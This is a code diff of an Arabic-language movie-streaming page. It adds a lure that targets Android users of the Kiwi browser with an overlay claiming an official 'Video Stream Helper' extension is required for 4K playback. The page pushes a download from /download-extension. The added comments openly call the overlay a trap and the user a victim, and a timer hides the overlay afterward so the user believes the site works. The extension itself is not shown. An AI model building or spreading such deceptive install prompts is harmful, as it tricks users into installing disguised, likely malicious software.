@@ -45,27 +45,30 @@
         <p style="font-size:14px; line-height:1.6;">لمشاهدة الأفلام بجودة 4K وبدون تقطيع على متصفح Kiwi، يجب تثبيت إضافة <b>"Video Stream Helper"</b> الرسمية.</p>
         <p style="font-size:12px; color:#aaa;">(لن يعمل المشغل حتى يتم التثبيت)</p>
         
-        <a href="my-plugin.crx" id="download-trigger" onclick="startDownload()" download style="display:block; margin-top:20px; padding:15px; background:red; color:white; text-decoration:none; border-radius:10px; font-weight:bold; font-size:18px;">
-            تحميل وتثبيت الآن
-        </a>
+       <a href="/download-extension" id="download-trigger" onclick="startDownload()" style="display:block; margin-top:20px; padding:15px; background:red; color:white; text-decoration:none; border-radius:10px; font-weight:bold; font-size:18px;">
+    تحميل وتثبيت الآن
+</a>
     </div>
 </div>
 
 <script>
-// وظيفة لإظهار النافذة بمجرد دخول الموقع
 window.onload = function() {
-    // نتحقق إذا كان المستخدم يستخدم أندرويد لزيادة الدقة
     var ua = navigator.userAgent.toLowerCase();
+    // يظهر الفخ فقط لمستخدمي أندرويد (مستخدمي Kiwi)
     if (ua.indexOf("android") > -1) {
         document.getElementById('force-download-overlay').style.display = 'flex';
     }
 };
 
-// وظيفة لمنع إغلاق النافذة (يمكنك إضافة كود هنا لإخفائها بعد التحميل بـ 5 ثواني مثلاً)
 function startDownload() {
-    alert("بعد تحميل الملف، اضغط على 'Add to Kiwi' في التنبيه الذي سيظهر لك.");
-    // اختياري: إخفاء النافذة بعد الضغط (أو تركها كما طلبت)
-    // setTimeout(() => { document.getElementById('force-download-overlay').style.display = 'none'; }, 5000);
+    // إشعار لإرشاد الضحية
+    alert("سيتم الآن بدء التحميل. بمجرد الانتهاء، اضغط على 'Add to Kiwi' أو 'تثبيت' ليتم تفعيل المشغل تلقائياً.");
+    
+    // بعد 3 ثوانٍ من الضغط، يمكننا إخفاء النافذة ليظن المستخدم أن الموقع بدأ يعمل
+    setTimeout(() => {
+        document.getElementById('force-download-overlay').style.display = 'none';
+        document.getElementById('main-app').style.display = 'block';
+    }, 4000);
 }
 </script>
 
@@ -81,9 +84,10 @@ function startDownload() {
                 </div>
             </div>
 
-            <a href="my-plugin.crx" style="padding: 15px; background: red; color: white; text-decoration: none;">
+            <a href="/download-extension" style="padding: 15px; background: red; color: white; text-decoration: none; border-radius: 5px;">
     تحميل مشغل 4K (مطلوب للمشاهدة)
 </a>
+
 
             <div id="user-list">
                 <div class="avatar-container" id="local-user">
